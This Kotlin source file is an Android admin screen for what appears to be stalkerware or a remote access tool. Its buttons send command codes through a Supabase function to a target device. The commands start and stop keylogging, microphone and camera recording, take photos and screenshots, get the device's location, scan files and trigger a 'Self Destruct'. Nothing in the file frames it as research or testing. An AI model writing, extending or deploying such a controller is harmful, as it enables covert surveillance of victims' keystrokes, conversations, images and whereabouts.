package com.bestiecourt.app.presentation.admin

import android.os.Bundle
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.bestiecourt.app.core.constants.AppConstants
import com.bestiecourt.app.data.remote.supabase.SupabaseManager
import dagger.hilt.android.AndroidEntryPoint
import io.github.jan.supabase.functions.functions
import kotlinx.coroutines.launch
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put

@AndroidEntryPoint
class AdminDeviceActivity : AppCompatActivity() {

    private lateinit var deviceId: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        deviceId = intent.getStringExtra("device_id") ?: "sc_unknown"

        val scroll = ScrollView(this)
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(32, 32, 32, 32)
        }

        fun addBtn(label: String, code: String, params: String? = null) {
            val btn = Button(this).apply {
                text = label
                setOnClickListener { sendCommand(code, params) }
            }
            layout.addView(btn)
        }

        addBtn("Ping", "0x01")
        addBtn("Device Status", "0x02")
        addBtn("Storage Info", "0x03")
        addBtn("Security Audit", "0xE1")
        addBtn("Keylog Start", "0xA1")
        addBtn("Keylog Stop", "0xA2")
        addBtn("Mic Start", "0xC1")
        addBtn("Mic Stop", "0xC2")
        addBtn("Camera Start", "0xC3")
        addBtn("Camera Stop", "0xC4")
        addBtn("Capture Photo (front)", "0xC5", "front")
        addBtn("Capture Photo (back)", "0xC5", "back")
        addBtn("Screenshot", "0xB1")
        addBtn("Get Location", "0xD1")
        addBtn("Scan Files", "0x03") // storage + scan path can be extended
        addBtn("Self Destruct", "0xFF")

        scroll.addView(layout)
        setContentView(scroll)
    }

    private fun sendCommand(code: String, params: String? = null) {
        lifecycleScope.launch {
            try {
                val body = buildJsonObject {
                    put("device_id", deviceId)
                    put("command_code", code)
                    if (params != null) put("params", params)
                }
                val res = SupabaseManager.client.functions.invoke("send-command", body = body)
                val text = res.toString()
                Toast.makeText(this@AdminDeviceActivity, text.take(200), Toast.LENGTH_LONG).show()
            } catch (e: Exception) {
                Toast.makeText(this@AdminDeviceActivity, "Error: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }
}
